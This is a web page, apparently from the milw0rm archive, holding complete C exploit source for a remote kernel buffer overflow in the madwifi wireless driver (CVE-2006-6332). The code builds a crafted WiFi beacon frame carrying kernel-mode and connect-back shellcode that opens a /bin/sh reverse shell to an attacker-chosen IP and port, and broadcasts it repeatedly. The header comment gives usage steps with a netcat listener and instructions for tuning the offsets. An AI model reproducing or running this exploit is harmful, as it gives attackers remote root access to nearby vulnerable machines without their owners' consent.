<html><head><title>madwifi <= 0.9.2.1 WPA/RSN IE Remote Kernel Buffer Overflow Exploit</title></head><pre>/* ----  madwifi WPA/RSN IE remote kernel buffer overflow  ------
 * expoit code by:   sgrakkyu &lt;at&gt; antifork.org -- 10/1/2007
 * 
 * CVE: 2006-6332 (Laurent BUTTI, Jerome RAZNIEWSKI, Julien TINNES)
 * 
 * (for wpa)
 * ....
 * memcpy(buf, se-&gt;se_wpa_ie, se-&gt;se_wpa_ie[1] + 2) 
 * ....
 * ....
 * the function re-uses args in the stack before returning so we 
 * can't trash them overwriting. 
 * Different compiled module [ex. different version of gcc] may require 
 * a different pad value.. (see -g option)
 *
 * ex:
 * on one terminal runs: nc -l -p 31337 
 * phi:~/kexec/lorcon# gcc -g -o madwifi_exp madwifi_exp.c -lorcon
 * phi:~/kexec/lorcon# wlanconfig ath1 create wlandev wifi0 wlanmode monitor
 * phi:~/kexec/lorcon# ifconfig ath1 up
 * phi:~/kexec/lorcon# ./madwifi_exp -i ath1 -d madwifing -a 10.0.0.1 -p 31337
 * [opt-ip]: 10.0.0.1
 * [opt-port]: 31337
 * [opt-iface]: ath1
 * [opt-driver]: madwifing
 * [opt-jump]: 0xffffe777
 * [pad]: 36
 *
 * [*][Low Avail Byte]: 103
 * [*][High Avail Byte]: 47
 * [*][u_code[] (high)size]: 91, [ring0_code[] (low)size]: 47
 * [*][ patching jump ]: [eba7]
 * [*][Payload space]: 192
 * [*][beacon_frame-80211]=54
 * [*][beacon_WPA_IE_lenght]: 198
 *
 * [printing frame - start]
 *   80 00 00 00 ff ff ff ff ff ff cc cc cc cc cc cc
 *   cc cc cc cc cc cc 00 00 00 00 00 00 00 00 00 00
 *   64 00 01 00 00 03 41 41 41 01 08 82 84 8b 96 0c
 *   18 30 48 03 01 0b dd c6 00 50 f2 01 01 00 90 90
 *   90 90 90 90 90 90 90 90 90 90 31 c0 89 c3 40 40
 *   ....
 *   ....
 *
 *
 * Tuning option:
 * - depending on gcc version/optimization we have to change the padding of vector
 *   payload, take a look to the following disassembly of the module wlan.o compiled
 *   with gcc-4.0 (kernel compiled for i586):
 *
 *  00015a49 &lt;giwscan_cb&gt;:
 *  15a49:       55                      push   %ebp
 *  15a4a:       57                      push   %edi
 *  15a4b:       56                      push   %esi
 *  15a4c:       53                      push   %ebx
 *  15a4d:       81 ec c4 00 00 00       sub    $0xbc,%esp &lt;--16+188=[204]
 *  .........
 *  .........
 *  .........
 *  15fc3:       8d 54 24 12             lea    0xa(%esp),%edx &lt;-esp+[10]
 *  15fc7:       89 d7                   mov    %edx,%edi
 *  ...
 *  ...
 *  15fd5:       f3 a5                   rep movsl %ds:(%esi),%es:(%edi)
 *     
 * 
 * this is not a rule, check gcc generated code to calculate correct pad value :
 * [startbuf-ret] = (16 + 188 - 10) = 194 byte
 * PAD = 194 - SHELLCODE_SPACE - IEWPAheader(code,len,oui) = 194 - 150 - 8 = 36
 * ( -g 36 would be the choice in that case)
 *   
 *   NOTE: 1) the remote box must call the ioctl() SIOCGIWSCAN
 *            for ex. when the iface gets up or during iwlist iface scanning
 *            command
 *
 *         2) if you need more space for kernel mode code you can rely on
 *             struct ieee80211_scan_entry paramter of gwiscan_cb()
 *             function to access the real frame (a trivial joke)
 *
 *         3) i had no time to test this exploit on other boxes..:
 *            tested only on:  Slackware 10 -  madwifi 0.9.2
 *                             Kubuntu - kernel 2.6.17 - madwifi 0.9.2
 *
 *
 *  TNX TNX TNX  twiz &lt;at&gt; antifork.org
 */


#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;getopt.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;

#include &lt;tx80211.h&gt;
#include &lt;tx80211_packet.h&gt;
#include &lt;linux/wireless.h&gt;
#include &lt;arpa/inet.h&gt;


/* 2.6.17 VSYSCALL: for &gt;= 2.6.18 without fixed-vsyscall entry use kernel hardcoded value */
#define VSYSCALL_JMP_ESP_OFFSET   0xffffe777
#define IE_ZERO 0x00000000

#define FIX_BYTE(base,offset,byte)   *(((unsigned char*)base) + offset) = byte;
#define FIX_WORD(base,offset,word)   *((unsigned short *)((unsigned char*)base + offset)) = word;
#define FIX_DWORD(base,offset,dword) *((unsigned int *)((unsigned char*)base + offset)) = dword;

/* shellcode max buffer */
/* 8 bytes used for lenght + oui */
#define SHELLCODE_SPACE  150  
#define PAD_SPACE        36

#define PAYLOAD_SPACE    (SHELLCODE_SPACE + pad_space + 4 + 2)
#define TOTAL_PACKET_LEN (sizeof(beacon_80211_wpa) -1 + PAYLOAD_SPACE)

/* exp option */
char *iface = NULL;  /* needed */
char *driver = NULL; /* needed */
char *ip = NULL;     /* needed */
short port = 0;      /* needed */
unsigned int jmp_address = VSYSCALL_JMP_ESP_OFFSET;
unsigned int pad_space = PAD_SPACE;



/* ----------------------------------- */

#define SUB_OFFSET_PATCH 8
char ring0_code[]=
 &quot;\xe8\x00\x00\x00\x00&quot;      //call   8048359 &lt;main+0x21&gt;
 &quot;\x5e&quot;                      //pop    %esi
 &quot;\x81\xee\x88\x00\x00\x00&quot;  //sub    $0x88,%esi  /* PATCH */
 &quot;\x31\xc0&quot;                  //xor    %eax,%eax
 &quot;\xb0\x04&quot;                  //mov    $0x4,%al
 &quot;\x01\xc4&quot;                  //add    %eax,%esp
 &quot;\x83\x3c\x24\x73&quot;          //cmp    $0x73,%esp
 &quot;\x75\xf8&quot;                  //jne    8048364 &lt;main+0x2c&gt;
 &quot;\x83\x7c\x24\x0c\x7b&quot;      //cmpl   $0x7b,0xc(%esp)
 &quot;\x75\xf1&quot;                  //jne    8048364 &lt;main+0x2c&gt;
 &quot;\x29\xc4&quot;                  //sub    %eax,%esp
 &quot;\x8b\x7c\x24\x0c&quot;          //mov    0xc(%esp),%edi
 &quot;\x89\x3c\x24&quot;              //mov    %edi,(%esp)
 &quot;\x31\xc9&quot;                  //xor    %ecx,%ecx
 &quot;\xb1\x5b&quot;                  //mov    $0x5b,%cl /* FIX */
 &quot;\xf3\xa4&quot;                  //rep movsb %ds:(%esi),%es:(%edi)
 &quot;\xcf&quot;;                     //iret


/* connect back */
#define IP_OFFSET   35
#define PORT_OFFSET 44
char u_code[] = 
&quot;\x31\xc0\x89\xc3\x40\x40\xcd\x80\x39\xc3\x74\x03\x31\xc0\x40\xcd\x80&quot; /* fork */
&quot;\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5d&quot;              
&quot;\xbe&quot;
&quot;\xf5\xff\xff\xfe&quot;  // ~ip
&quot;\xf7\xd6\x56\x66\xbd&quot;
&quot;\x69\x7a&quot;          // port
&quot;\x0f\xcd\x09\xdd\x55\x43\x6a\x10\x51\x50\xb0\x66\x89\xe1\xcd\x80\x87\xd9&quot;   
&quot;\x5b\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68&quot;  
&quot;\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xdf&quot;;         


/* 802.11header + WPA IE prolog */
#define WPA_LEN_OFFSET 55
#define CHANNEL     11
char beacon_80211_wpa[] = 
&quot;\x80&quot;              // management frame / subtype beacon
&quot;\x00&quot;              // flags
&quot;\x00\x00&quot;          // duration
&quot;\xFF\xFF\xFF\xFF\xFF\xFF&quot;  // destination addr
&quot;\xCC\xCC\xCC\xCC\xCC\xCC&quot;  // src address
&quot;\xCC\xCC\xCC\xCC\xCC\xCC&quot;  // bbsid
&quot;\x00\x00&quot;          // seq
&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot; // timestamp
&quot;\x64\x00&quot;          // interval
&quot;\x01\x00&quot;          // caps
&quot;\x00\x03\x41\x41\x41&quot;  // ssid Information Element
&quot;\x01\x08\x82\x84\x8b\x96\x0c\x18\x30\x48&quot; // rates Information Element
&quot;\x03\x01\x0B&quot;     // channel Information Element (11)
&quot;\xdd\xc6&quot;         // WPA Information Element (priv ID + len) (0xc6 = 0xc0 + 6) /* PATCH */
&quot;\x00\x50\xf2\x01\x01\x00&quot;;     // oui + type + version (first 6 byte of len)

#define JUMP_OFFSET_PATCH 1
char jmp_back[]=&quot;\xeb\x00&quot;;

/* ----------------------------------- */


void usage(char *prog)
{
  printf(&quot;[usage]: %s (-i iface) (-d drivername) (-a ip) (-p port) [-g pad] [-j jump_address]\n&quot;, prog);
}

unsigned char *build_frame()
{
  int i,j;
  char *frame = malloc(TOTAL_PACKET_LEN);
  char *ptr = frame;
  
  unsigned int hsb = sizeof(ring0_code)-1;
  unsigned int lsb =  SHELLCODE_SPACE - hsb;
  printf(&quot;[*][low-kcode]: %d\n[*][high-ucode]: %d\n&quot;, 
         lsb, hsb);
  
  printf(&quot;[*][u_code[] (high)size]: %d, [ring0_code[] (low)size]: %d\n&quot;, 
         sizeof(u_code)-1, sizeof(ring0_code)-1);

  /* fix jump */
  int b = -4 - pad_space - (sizeof(jmp_back)-1) - (sizeof(ring0_code)-1);
  FIX_BYTE(jmp_back, JUMP_OFFSET_PATCH, b);

  /* fix ring0_code/u_code displacement */
  unsigned int sub = 5 + (sizeof(u_code)-1);
  FIX_BYTE(ring0_code, SUB_OFFSET_PATCH, sub);

  printf(&quot;[*][payload space]: %d\n&quot;, PAYLOAD_SPACE);

  /* fix beacon_80211_wpa: WPA len */
  FIX_BYTE(beacon_80211_wpa, WPA_LEN_OFFSET, PAYLOAD_SPACE + 6);
  printf(&quot;[*][beacon_WPA_IE_lenght]: %u\n&quot;, 
                  (unsigned char)beacon_80211_wpa[WPA_LEN_OFFSET]);

  /* fill frame */
  memset(frame, 0x00, TOTAL_PACKET_LEN);

  memcpy(ptr, beacon_80211_wpa, sizeof(beacon_80211_wpa)-1);
  ptr += (sizeof(beacon_80211_wpa)-1);

  memset(ptr, 0x90, lsb - (sizeof(u_code)-1));
  ptr += (lsb - (sizeof(u_code)-1));
  
  memcpy(ptr, u_code, sizeof(u_code) -1);
  ptr += (sizeof(u_code) -1);

  memcpy(ptr, ring0_code, sizeof(ring0_code)-1);
  ptr += sizeof(ring0_code)-1;
  
  for(i=0; i&lt;pad_space; i+=4) 
    *((unsigned int *)(ptr + i)) = (IE_ZERO+(i/4));

  ptr += pad_space;

  *((unsigned int *)(ptr)) = jmp_address;
  ptr += 4;

  memcpy(ptr, jmp_back, sizeof(jmp_back)-1);
  ptr += sizeof(jmp_back)-1;

  return (unsigned char*)frame; 
}

void print_frame(unsigned char *frame, unsigned int size)
{
  int i;
  printf(&quot;\n[printing frame - start]\n  &quot;);
  for(i=1; i&lt;=size; i++)
  {
    printf(&quot;%02x &quot;, frame[i-1]);
    if((i % 16) == 0)
      printf(&quot;\n  &quot;);
  }
  printf(&quot;\n[printing frame - end]\n&quot;);
}

void parse_arg(int argc, char **argv)
{
  int opt;
  struct in_addr in;
  while( (opt=getopt(argc, argv, &quot;j:i:a:p:d:g:&quot;)) != EOF)
  {
    switch(opt)
    {
      case 'j':
        jmp_address = strtoll(optarg, NULL, 16);
        break;
      case 'a':
        ip = strdup(optarg);
        inet_aton(ip, &amp;in); 
        FIX_DWORD(u_code, IP_OFFSET, ~(in.s_addr));    
        break;
      case 'p':
        port = atoi(optarg);
        FIX_WORD(u_code, PORT_OFFSET, port); 
        break;
      case 'd':
        driver = strdup(optarg);
        break;
      case 'i':
        iface = strdup(optarg);
        break;
      case 'g':
        pad_space = atoi(optarg);
        break;
      default:
        usage(argv[0]);
        exit(1);
    } 
  }
}


int main(int argc, char *argv[])
{
  int i=0;
  struct tx80211 in_tx;
  struct tx80211_packet in_packet;
  int drivertype;
  
  parse_arg(argc, argv);                

  if(!iface || !driver || !ip || !port)
  {
    usage(argv[0]);
    exit(1);
  }

  printf( &quot;\n\nMadwifi 0.9.2 WPA/RSN IE buffer overflow\n\t exploit code: sgrakkyu &lt;at&gt; antifork.org\n&quot;
          &quot;-------------------- **** ------------------\n&quot;
          &quot;[opt-ip]: %s\n[opt-port]: %d\n[opt-iface]: %s\n[opt-driver]: %s\n[opt-jump]: 0x%08x\n[pad]: %d\n&quot;
          &quot;-------------------- **** ------------------\n\n&quot;,
          ip, port, iface, driver, jmp_address, pad_space);

  unsigned char *frame = build_frame();
  print_frame(frame, TOTAL_PACKET_LEN);

  /* Use the command-line argument as the desired driver type */
  drivertype = tx80211_resolvecard(driver);

  /* Validate the driver name specified */
  if (drivertype == INJ_NODRIVER) 
  {
    fprintf(stderr, &quot;Driver name not recognized.\n&quot;);
    return -1;
  }

  if (tx80211_init(&amp;in_tx, iface, drivertype) &lt; 0) {
    fprintf(stderr, &quot;Error initializing drive \&quot;%s\&quot;.\n&quot;, argv[1]);
    return -1;
  }

  if ((tx80211_getcapabilities(&amp;in_tx) &amp; TX80211_CAP_CTRL) == 0) 
  {
    fprintf(stderr, &quot;Driver does not support transmitting control frames.\n&quot;);
    return -1;
  }

  if (tx80211_setchannel(&amp;in_tx, CHANNEL) &lt; 0) 
  {
    fprintf(stderr, &quot;Error setting channel.\n&quot;);
    return 1;
  }

  if (tx80211_open(&amp;in_tx) &lt; 0) 
  {
    fprintf(stderr, &quot;Unable to open interface %s.\n&quot;, in_tx.ifname);
    return 1;
  }

  /* Initialized in_packet with packet contents and length of the packet */
  in_packet.packet = frame;
  in_packet.plen = TOTAL_PACKET_LEN;

  printf(&quot;[sending packets]: about 10 a second\n&quot;);

  while(i &lt; 10000)
  {
    /* Transmit the packet */
    if (tx80211_txpacket(&amp;in_tx, &amp;in_packet) &lt; 0) 
    {
      fprintf(stderr, &quot;Unable to transmit packet.\n&quot;);
      perror(&quot;txpacket&quot;);
      return 1;
    }
    i++;
    usleep(100000);
  }
  /* Close the socket after transmitting the packet */
  tx80211_close(&amp;in_tx);

  return 0;
}

// milw0rm.com [2007-03-01]</pre></html>